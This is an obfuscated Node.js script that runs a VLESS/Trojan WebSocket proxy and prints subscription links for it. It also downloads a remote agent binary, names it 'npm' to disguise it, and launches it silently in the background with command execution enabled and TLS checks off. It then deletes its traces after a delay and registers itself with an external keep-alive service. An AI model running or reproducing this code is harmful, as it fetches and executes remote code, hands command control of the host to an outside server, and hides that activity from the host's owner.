const _0x20f4d5=_0xb5ac;(function(_0x3bd388,_0x46c482){const _0x579c42=_0xb5ac,_0x43ac85=_0x3bd388();while(!![]){try{const _0x4923b3=parseInt(_0x579c42(0x1eb))/0x1*(-parseInt(_0x579c42(0x216))/0x2)+-parseInt(_0x579c42(0x20a))/0x3*(parseInt(_0x579c42(0x217))/0x4)+-parseInt(_0x579c42(0x231))/0x5+-parseInt(_0x579c42(0x1e7))/0x6*(parseInt(_0x579c42(0x1e9))/0x7)+parseInt(_0x579c42(0x1f0))/0x8+parseInt(_0x579c42(0x23d))/0x9*(-parseInt(_0x579c42(0x238))/0xa)+-parseInt(_0x579c42(0x205))/0xb*(-parseInt(_0x579c42(0x1f3))/0xc);if(_0x4923b3===_0x46c482)break;else _0x43ac85['push'](_0x43ac85['shift']());}catch(_0x19a6d2){_0x43ac85['push'](_0x43ac85['shift']());}}}(_0x1a5f,0x7c0e7));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x20f4d5(0x235)),net=require(_0x20f4d5(0x239)),path=require(_0x20f4d5(0x209)),crypto=require('crypto'),{Buffer}=require(_0x20f4d5(0x1e5)),{exec,execSync}=require(_0x20f4d5(0x23b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x20f4d5(0x1fc)]||_0x20f4d5(0x210),NEZHA_SERVER=process[_0x20f4d5(0x248)][_0x20f4d5(0x226)]||'',NEZHA_PORT=process[_0x20f4d5(0x248)][_0x20f4d5(0x1d1)]||'',NEZHA_KEY=process['env'][_0x20f4d5(0x1d7)]||'',DOMAIN=process[_0x20f4d5(0x248)][_0x20f4d5(0x23c)]||_0x20f4d5(0x233),AUTO_ACCESS=process[_0x20f4d5(0x248)][_0x20f4d5(0x21b)]||!![],WSPATH=process[_0x20f4d5(0x248)][_0x20f4d5(0x228)]||UUID[_0x20f4d5(0x1db)](0x0,0x8),SUB_PATH=process[_0x20f4d5(0x248)][_0x20f4d5(0x23f)]||_0x20f4d5(0x247),NAME=process[_0x20f4d5(0x248)][_0x20f4d5(0x23a)]||'',PORT=process[_0x20f4d5(0x248)][_0x20f4d5(0x1e1)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x20498d=_0x20f4d5;try{const _0x2e7adf=await axios['get'](_0x20498d(0x212)),_0x25c0a7=_0x2e7adf[_0x20498d(0x1de)];ISP=(_0x25c0a7[_0x20498d(0x22d)]+'-'+_0x25c0a7[_0x20498d(0x213)])[_0x20498d(0x20d)](/ /g,'_');}catch(_0x56f8e9){ISP=_0x20498d(0x1cf);}};GetISP();const httpServer=http['createServer']((_0x55d2c6,_0x181974)=>{const _0x1813b5=_0x20f4d5;if(_0x55d2c6[_0x1813b5(0x214)]==='/'){const _0xfdcb16=path[_0x1813b5(0x206)](__dirname,_0x1813b5(0x1fb));fs[_0x1813b5(0x1f1)](_0xfdcb16,_0x1813b5(0x234),(_0x12408d,_0x4530eb)=>{const _0x4bb0ae=_0x1813b5;if(_0x12408d){_0x181974['writeHead'](0xc8,{'Content-Type':_0x4bb0ae(0x237)}),_0x181974['end'](_0x4bb0ae(0x227));return;}_0x181974[_0x4bb0ae(0x1f9)](0xc8,{'Content-Type':_0x4bb0ae(0x237)}),_0x181974[_0x4bb0ae(0x1d6)](_0x4530eb);});return;}else{if(_0x55d2c6[_0x1813b5(0x214)]==='/'+SUB_PATH){const _0x48deb8=NAME?NAME+'-'+ISP:ISP,_0xb6e0ac='vless://'+UUID+'@'+DOMAIN+_0x1813b5(0x215)+DOMAIN+_0x1813b5(0x24c)+DOMAIN+_0x1813b5(0x20c)+WSPATH+'#'+_0x48deb8,_0x7afb48=_0x1813b5(0x1ec)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x1813b5(0x24c)+DOMAIN+_0x1813b5(0x20c)+WSPATH+'#'+_0x48deb8,_0x2c1cd0=_0xb6e0ac+'\x0a'+_0x7afb48,_0x4c108c=Buffer[_0x1813b5(0x1f4)](_0x2c1cd0)[_0x1813b5(0x1d2)](_0x1813b5(0x1e0));_0x181974[_0x1813b5(0x1f9)](0xc8,{'Content-Type':_0x1813b5(0x24d)}),_0x181974[_0x1813b5(0x1d6)](_0x4c108c+'\x0a');}else _0x181974[_0x1813b5(0x1f9)](0x194,{'Content-Type':'text/plain'}),_0x181974[_0x1813b5(0x1d6)](_0x1813b5(0x1f2));}}),wss=new WebSocket[(_0x20f4d5(0x208))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x20f4d5(0x1ea),'1.1.1.1'];function resolveHost(_0x33e6f2){return new Promise((_0xd431aa,_0x5586c1)=>{const _0x2a2518=_0xb5ac;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2a2518(0x1fd)](_0x33e6f2)){_0xd431aa(_0x33e6f2);return;}let _0xab2c1f=0x0;function _0x2e1988(){const _0x4b9969=_0x2a2518;if(_0xab2c1f>=DNS_SERVERS[_0x4b9969(0x220)]){_0x5586c1(new Error(_0x4b9969(0x1ef)+_0x33e6f2+_0x4b9969(0x1fa)));return;}const _0x3858cc=DNS_SERVERS[_0xab2c1f];_0xab2c1f++;const _0x39c9ab=_0x4b9969(0x1e4)+encodeURIComponent(_0x33e6f2)+_0x4b9969(0x241);axios['get'](_0x39c9ab,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x4b9969(0x20f)](_0x37f4cd=>{const _0x2586df=_0x4b9969,_0xae30f9=_0x37f4cd['data'];if(_0xae30f9[_0x2586df(0x20e)]===0x0&&_0xae30f9[_0x2586df(0x244)]&&_0xae30f9[_0x2586df(0x244)][_0x2586df(0x220)]>0x0){const _0x4b4268=_0xae30f9[_0x2586df(0x244)][_0x2586df(0x1d9)](_0x3e7587=>_0x3e7587[_0x2586df(0x1e2)]===0x1);if(_0x4b4268){_0xd431aa(_0x4b4268['data']);return;}}_0x2e1988();})[_0x4b9969(0x221)](_0x55dd66=>{_0x2e1988();});}_0x2e1988();});}function handleVlessConnection(_0x2734ef,_0x571bd1){const _0x4b7f92=_0x20f4d5,[_0x17fdad]=_0x571bd1,_0x1163b4=_0x571bd1[_0x4b7f92(0x1db)](0x1,0x11);if(!_0x1163b4[_0x4b7f92(0x1ff)]((_0x136aaf,_0x469f88)=>_0x136aaf==parseInt(uuid['substr'](_0x469f88*0x2,0x2),0x10)))return![];let _0x326adc=_0x571bd1[_0x4b7f92(0x1db)](0x11,0x12)[_0x4b7f92(0x1ee)]()+0x13;const _0x5de0e2=_0x571bd1[_0x4b7f92(0x1db)](_0x326adc,_0x326adc+=0x2)[_0x4b7f92(0x1df)](0x0),_0x15d8e7=_0x571bd1['slice'](_0x326adc,_0x326adc+=0x1)[_0x4b7f92(0x1ee)](),_0x1f7895=_0x15d8e7==0x1?_0x571bd1[_0x4b7f92(0x1db)](_0x326adc,_0x326adc+=0x4)[_0x4b7f92(0x206)]('.'):_0x15d8e7==0x2?new TextDecoder()[_0x4b7f92(0x21e)](_0x571bd1[_0x4b7f92(0x1db)](_0x326adc+0x1,_0x326adc+=0x1+_0x571bd1[_0x4b7f92(0x1db)](_0x326adc,_0x326adc+0x1)[_0x4b7f92(0x1ee)]())):_0x15d8e7==0x3?_0x571bd1[_0x4b7f92(0x1db)](_0x326adc,_0x326adc+=0x10)[_0x4b7f92(0x202)]((_0x34de1d,_0x57b0f3,_0x1e7a10,_0x36ce07)=>_0x1e7a10%0x2?_0x34de1d[_0x4b7f92(0x21c)](_0x36ce07[_0x4b7f92(0x1db)](_0x1e7a10-0x1,_0x1e7a10+0x1)):_0x34de1d,[])[_0x4b7f92(0x225)](_0x23863a=>_0x23863a['readUInt16BE'](0x0)[_0x4b7f92(0x1d2)](0x10))[_0x4b7f92(0x206)](':'):'';_0x2734ef[_0x4b7f92(0x203)](new Uint8Array([_0x17fdad,0x0]));const _0x1bc262=createWebSocketStream(_0x2734ef);return resolveHost(_0x1f7895)[_0x4b7f92(0x20f)](_0x20b972=>{const _0x7d6cbc=_0x4b7f92;net[_0x7d6cbc(0x22f)]({'host':_0x20b972,'port':_0x5de0e2},function(){const _0x2e7ff9=_0x7d6cbc;this[_0x2e7ff9(0x1d5)](_0x571bd1[_0x2e7ff9(0x1db)](_0x326adc)),_0x1bc262['on'](_0x2e7ff9(0x23e),()=>{})[_0x2e7ff9(0x1d3)](this)['on']('error',()=>{})['pipe'](_0x1bc262);})['on'](_0x7d6cbc(0x23e),()=>{});})[_0x4b7f92(0x221)](_0x8e125a=>{const _0x2842d3=_0x4b7f92;net[_0x2842d3(0x22f)]({'host':_0x1f7895,'port':_0x5de0e2},function(){const _0x2c44e0=_0x2842d3;this[_0x2c44e0(0x1d5)](_0x571bd1[_0x2c44e0(0x1db)](_0x326adc)),_0x1bc262['on']('error',()=>{})[_0x2c44e0(0x1d3)](this)['on'](_0x2c44e0(0x23e),()=>{})[_0x2c44e0(0x1d3)](_0x1bc262);})['on'](_0x2842d3(0x23e),()=>{});}),!![];}function _0xb5ac(_0x53751a,_0x5118f6){_0x53751a=_0x53751a-0x1cf;const _0x1a5fea=_0x1a5f();let _0xb5ac82=_0x1a5fea[_0x53751a];return _0xb5ac82;}function handleTrojanConnection(_0xa58845,_0xd6315e){const _0x3b72cc=_0x20f4d5;try{if(_0xd6315e[_0x3b72cc(0x220)]<0x3a)return![];const _0x475a03=_0xd6315e[_0x3b72cc(0x1db)](0x0,0x38)[_0x3b72cc(0x1d2)](),_0x3d42a1=[UUID];let _0x359cd5=null;for(const _0x14e67e of _0x3d42a1){const _0x807475=crypto[_0x3b72cc(0x22e)](_0x3b72cc(0x242))[_0x3b72cc(0x224)](_0x14e67e)[_0x3b72cc(0x1f6)](_0x3b72cc(0x20b));if(_0x807475===_0x475a03){_0x359cd5=_0x14e67e;break;}}if(!_0x359cd5)return![];let _0x28e9f0=0x38;_0xd6315e[_0x28e9f0]===0xd&&_0xd6315e[_0x28e9f0+0x1]===0xa&&(_0x28e9f0+=0x2);const _0x5dff33=_0xd6315e[_0x28e9f0];if(_0x5dff33!==0x1)return![];_0x28e9f0+=0x1;const _0x324bce=_0xd6315e[_0x28e9f0];_0x28e9f0+=0x1;let _0x10fda2,_0x41ce77;if(_0x324bce===0x1)_0x10fda2=_0xd6315e[_0x3b72cc(0x1db)](_0x28e9f0,_0x28e9f0+0x4)[_0x3b72cc(0x206)]('.'),_0x28e9f0+=0x4;else{if(_0x324bce===0x3){const _0xa3cf56=_0xd6315e[_0x28e9f0];_0x28e9f0+=0x1,_0x10fda2=_0xd6315e['slice'](_0x28e9f0,_0x28e9f0+_0xa3cf56)[_0x3b72cc(0x1d2)](),_0x28e9f0+=_0xa3cf56;}else{if(_0x324bce===0x4)_0x10fda2=_0xd6315e[_0x3b72cc(0x1db)](_0x28e9f0,_0x28e9f0+0x10)['reduce']((_0x13ce8d,_0x42d3af,_0x1228eb,_0x1ad397)=>_0x1228eb%0x2?_0x13ce8d[_0x3b72cc(0x21c)](_0x1ad397[_0x3b72cc(0x1db)](_0x1228eb-0x1,_0x1228eb+0x1)):_0x13ce8d,[])['map'](_0x524b42=>_0x524b42[_0x3b72cc(0x1df)](0x0)['toString'](0x10))[_0x3b72cc(0x206)](':'),_0x28e9f0+=0x10;else return![];}}_0x41ce77=_0xd6315e[_0x3b72cc(0x1df)](_0x28e9f0),_0x28e9f0+=0x2;_0x28e9f0<_0xd6315e['length']&&_0xd6315e[_0x28e9f0]===0xd&&_0xd6315e[_0x28e9f0+0x1]===0xa&&(_0x28e9f0+=0x2);const _0x571da0=createWebSocketStream(_0xa58845);return resolveHost(_0x10fda2)[_0x3b72cc(0x20f)](_0x5b8029=>{const _0xe21102=_0x3b72cc;net[_0xe21102(0x22f)]({'host':_0x5b8029,'port':_0x41ce77},function(){const _0x487929=_0xe21102;_0x28e9f0<_0xd6315e[_0x487929(0x220)]&&this[_0x487929(0x1d5)](_0xd6315e[_0x487929(0x1db)](_0x28e9f0)),_0x571da0['on'](_0x487929(0x23e),()=>{})['pipe'](this)['on'](_0x487929(0x23e),()=>{})[_0x487929(0x1d3)](_0x571da0);})['on'](_0xe21102(0x23e),()=>{});})[_0x3b72cc(0x221)](_0x4bf801=>{const _0x1dfbc8=_0x3b72cc;net[_0x1dfbc8(0x22f)]({'host':_0x10fda2,'port':_0x41ce77},function(){const _0x39e969=_0x1dfbc8;_0x28e9f0<_0xd6315e[_0x39e969(0x220)]&&this[_0x39e969(0x1d5)](_0xd6315e['slice'](_0x28e9f0)),_0x571da0['on'](_0x39e969(0x23e),()=>{})[_0x39e969(0x1d3)](this)['on'](_0x39e969(0x23e),()=>{})[_0x39e969(0x1d3)](_0x571da0);})['on'](_0x1dfbc8(0x23e),()=>{});}),!![];}catch(_0x3af100){return![];}}wss['on'](_0x20f4d5(0x1dd),(_0x101bdb,_0x18b395)=>{const _0x48b4b3=_0x20f4d5,_0x34687b=_0x18b395[_0x48b4b3(0x214)]||'';_0x101bdb[_0x48b4b3(0x1f5)](_0x48b4b3(0x218),_0x4d5edb=>{const _0x32c87b=_0x48b4b3;if(_0x4d5edb[_0x32c87b(0x220)]>0x11&&_0x4d5edb[0x0]===0x0){const _0x4e6ba7=_0x4d5edb[_0x32c87b(0x1db)](0x1,0x11),_0x2e6157=_0x4e6ba7[_0x32c87b(0x1ff)]((_0xe5adeb,_0x2f60de)=>_0xe5adeb==parseInt(uuid[_0x32c87b(0x204)](_0x2f60de*0x2,0x2),0x10));if(_0x2e6157){!handleVlessConnection(_0x101bdb,_0x4d5edb)&&_0x101bdb[_0x32c87b(0x1e8)]();return;}}!handleTrojanConnection(_0x101bdb,_0x4d5edb)&&_0x101bdb[_0x32c87b(0x1e8)]();})['on']('error',()=>{});});function _0x1a5f(){const _0x3a199f=['Server','path','224622AkaRfd','hex','&path=%2F','replace','Status','then','a3f9c7d2-8b41-4e6a-9f2d-5c7e18b4d905','utf-8','https://api.ip.sb/geoip','isp','url',':443?encryption=none&security=tls&sni=','2Gvgixm','44VnDbdN','message','2053','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','AUTO_ACCESS','concat','https://oooo.serv00.net/add-url','decode','aarch64','length','catch','trim','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','update','map','NEZHA_SERVER','Hello\x20world!','WSPATH','split','error:\x20','2087','2083','country_code','createHash','connect','https://amd64.ssss.nyc.mn/agent','829720rUXlhc','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','1234.abc.com','utf8','axios','config.yaml','text/html','8100MFbfik','net','NAME','child_process','DOMAIN','9549UEsQya','error','SUB_PATH','npm\x20is\x20already\x20running,\x20skip\x20running...','&type=A','sha224','createWriteStream','Answer','pop','/bin/bash','sub','env','Server\x20is\x20running\x20on\x20port\x20','npm\x20running\x20error:','log','&fp=chrome&type=ws&host=','text/plain','Unknown','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA_PORT','toString','pipe','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','write','end','NEZHA_KEY','https://arm64.ssss.nyc.mn/v1','find','unlink','slice','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','connection','data','readUInt16BE','base64','PORT','type','application/json','https://dns.google/resolve?name=','buffer','setsid\x20nohup\x20./npm\x20-s\x20','8970sUmrup','close','3164scRxeu','8.8.4.4','30093tdMAZR','trojan://','includes','readUInt8','Failed\x20to\x20resolve\x20','5719160upNhBr','readFile','Not\x20Found\x0a','852wtxsdK','from','once','digest','443','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','writeHead','\x20with\x20all\x20DNS\x20servers','index.html','UUID','test','npm\x20is\x20running','every','npm\x20download\x20successfully','https://amd64.ssss.nyc.mn/v1','reduce','send','substr','363781VliJcz','join','true'];_0x1a5f=function(){return _0x3a199f;};return _0x1a5f();}const getDownloadUrl=()=>{const _0x33406c=_0x20f4d5,_0x213d8e=os['arch']();return _0x213d8e==='arm'||_0x213d8e==='arm64'||_0x213d8e===_0x33406c(0x21f)?!NEZHA_PORT?_0x33406c(0x1d8):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x33406c(0x201):_0x33406c(0x230);},downloadFile=async()=>{const _0x4b8aea=_0x20f4d5;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x12f136=getDownloadUrl(),_0x51ed20=await axios({'method':'get','url':_0x12f136,'responseType':'stream'}),_0x3ef05a=fs[_0x4b8aea(0x243)]('npm');return _0x51ed20[_0x4b8aea(0x1de)]['pipe'](_0x3ef05a),new Promise((_0x1b067e,_0x2def2d)=>{_0x3ef05a['on']('finish',()=>{const _0x5cc703=_0xb5ac;console['log'](_0x5cc703(0x200)),exec('chmod\x20+x\x20npm',_0x37b925=>{if(_0x37b925)_0x2def2d(_0x37b925);_0x1b067e();});}),_0x3ef05a['on']('error',_0x2def2d);});}catch(_0x3ee077){throw _0x3ee077;}},runnz=async()=>{const _0x2539c1=_0x20f4d5;try{const _0x5b6482=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2539c1(0x211)});if(_0x5b6482[_0x2539c1(0x222)]()!==''){console[_0x2539c1(0x24b)](_0x2539c1(0x240));return;}}catch(_0xf6f0a2){}await downloadFile();let _0x33b5cc='',_0x1c719d=[_0x2539c1(0x1f7),'8443','2096',_0x2539c1(0x22b),_0x2539c1(0x22c),_0x2539c1(0x219)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x344056=_0x1c719d[_0x2539c1(0x1ed)](NEZHA_PORT)?'--tls':'';_0x33b5cc=_0x2539c1(0x1e6)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x344056+_0x2539c1(0x232);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x504fd0=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2539c1(0x229)](':')[_0x2539c1(0x245)]():'',_0x22cf59=_0x1c719d[_0x2539c1(0x1ed)](_0x504fd0)?_0x2539c1(0x207):'false',_0x104950='client_secret:\x20'+NEZHA_KEY+_0x2539c1(0x21a)+NEZHA_SERVER+_0x2539c1(0x223)+_0x22cf59+_0x2539c1(0x1f8)+UUID;fs['writeFileSync'](_0x2539c1(0x236),_0x104950);}_0x33b5cc=_0x2539c1(0x1dc);}else{console[_0x2539c1(0x24b)](_0x2539c1(0x1d4));return;}}try{exec(_0x33b5cc,{'shell':_0x2539c1(0x246)},_0x380b0e=>{const _0x26ece7=_0x2539c1;if(_0x380b0e)console['error'](_0x26ece7(0x24a),_0x380b0e);else console[_0x26ece7(0x24b)](_0x26ece7(0x1fe));});}catch(_0x1e8442){console[_0x2539c1(0x23e)](_0x2539c1(0x22a)+_0x1e8442);}};async function addAccessTask(){const _0x3aed90=_0x20f4d5;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x28002b='https://'+DOMAIN;try{const _0x9a07ff=await axios['post'](_0x3aed90(0x21d),{'url':_0x28002b},{'headers':{'Content-Type':_0x3aed90(0x1e3)}});console[_0x3aed90(0x24b)](_0x3aed90(0x1d0));}catch(_0x229ce1){}}const delFiles=()=>{const _0x2cf03a=_0x20f4d5;fs[_0x2cf03a(0x1da)]('npm',()=>{}),fs[_0x2cf03a(0x1da)](_0x2cf03a(0x236),()=>{});};httpServer['listen'](PORT,()=>{const _0x4223ed=_0x20f4d5;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4223ed(0x24b)](_0x4223ed(0x249)+PORT);});
